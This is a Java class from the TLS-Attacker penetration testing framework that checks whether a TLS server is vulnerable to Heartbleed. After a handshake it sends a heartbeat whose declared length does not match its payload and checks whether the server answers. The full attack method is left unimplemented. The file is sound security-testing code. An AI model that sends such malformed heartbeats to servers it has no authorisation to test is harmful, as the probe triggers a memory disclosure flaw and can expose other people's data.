/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.HeartbeatMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the
 * server responds with a valid heartbeat message.
 */
public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     *
     * @param config
     * @param baseConfig
     */
    public HeartbleedAttacker(HeartbleedCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        throw new UnsupportedOperationException("Not implemented yet");
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = getTlsConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(
                WorkflowTraceType.HANDSHAKE, RunningModeType.CLIENT);
        HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
        trace.addTlsAction(new SendAction(message));
        trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
        State state = new State(tlsConfig, trace);
        ModifiableByte heartbeatMessageType = new ModifiableByte();
        ModifiableInteger payloadLength = new ModifiableInteger();
        payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
        ModifiableByteArray payload = new ModifiableByteArray();
        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
        message.setHeartbeatMessageType(heartbeatMessageType);
        message.setPayload(payload);
        message.setPayloadLength(payloadLength);

        try {
            WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                    tlsConfig.getWorkflowExecutorType(), state);
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info("The TLS protocol flow was not executed completely, follow the debug messages for more information.");
            LOGGER.debug(ex);
        }

        if (WorkflowTraceUtil.didReceiveMessage(ProtocolMessageType.HEARTBEAT, trace)) {
            LOGGER.info("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
            return true;
        } else if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
            return null;
        } else {
            LOGGER.info("(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
            return false;
        }
    }
}
